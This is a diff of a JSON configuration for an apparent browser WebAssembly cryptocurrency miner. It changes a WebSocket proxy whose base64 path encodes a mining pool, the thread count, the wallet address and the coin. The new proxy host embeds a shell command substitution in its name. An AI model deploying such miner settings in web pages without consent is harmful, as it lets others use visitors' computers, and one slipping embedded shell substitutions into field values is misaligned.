@@ -1,5 +1,5 @@
 {
-  "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==",
-  "config": { "threads": 8, "log": true },
-  "options": { "user": "RYJVM8YKZfHJpN1cevUKWkEqLfMbUz7Rk5", "password": "c=RVN", "argent": "web-wasm/1.0" }
+  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Y29pbnhwLnRlYXRzcHJheS51azo4MjQz",
+  "config": { "threads": 6, "log": true },
+  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.Test", "password": "c=MAZA,m=solo", "argent": "web-wasm/1.0" }
 }
